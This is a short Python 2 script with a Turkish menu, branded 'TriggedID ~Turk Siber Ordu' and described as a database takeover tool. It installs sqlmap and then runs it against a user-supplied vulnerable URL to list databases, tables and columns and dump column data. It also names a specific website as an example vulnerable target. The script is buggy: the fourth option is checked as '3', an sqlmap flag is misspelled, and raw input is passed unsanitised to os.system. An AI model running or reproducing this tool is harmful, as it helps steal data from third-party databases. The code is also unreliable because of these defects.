#!/usr/bin/python
# -*- coding: utf-8 -*-

import os 

os.system("apt-get install figlet")
os.system("apt-get install sqlmap")
os.system("clear")
os.system("figlet TriggedID")
print("""
Veri Tabanı Ele Geçirme TriggedID ~Turk Siber Ordu 
1) Sadece Açıklı Linki Biliyorum.
2) Açıklı Linki, Veritabanı Adını Biliyorum.
3) Açıklı Linki, Veritabanı Adı, Tablo Adını Biliyorum.
4) Açıklı Linki, Veritavabı Adı, Tablo Adı, Colon Adını Biliyorum.

Örnek Açıklı Site : http://www.suesupriano.com/article.php?id=25

""")

islemno = raw_input("İşlem No Girin: ")
if(islemno == "1"):
        aciklilink = raw_input("Açıklı  Linki Girin: ")
        os.system("sqlmap -u " + aciklilink + " --dbs --random-agent ")
        
if(islemno == "2"):
        aciklilink = raw_input("Açıklı  Linki Girin: ")
        veritabani = raw_input("Veritabanı Adını Girin: ")
        os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
        
if(islemno == "3"):
        aciklilink = raw_input("Açıklı  Linki Girin: ")
        veritabani = raw_input("Veritabanı Adını Girin: ")
        tablo = raw_input("Tablo Adını Girin: ")
        os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --colums --random-agent")
        
if(islemno == "3"):
        aciklilink = raw_input("Açıklı  Linki Girin: ")
        veritabani = raw_input("Veritabanı Adını Girin: ")
        tablo = raw_input("Tablo Adını Girin: ")
        colon = raw_input("Kolon Adını Girin: ")
        os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
        
        
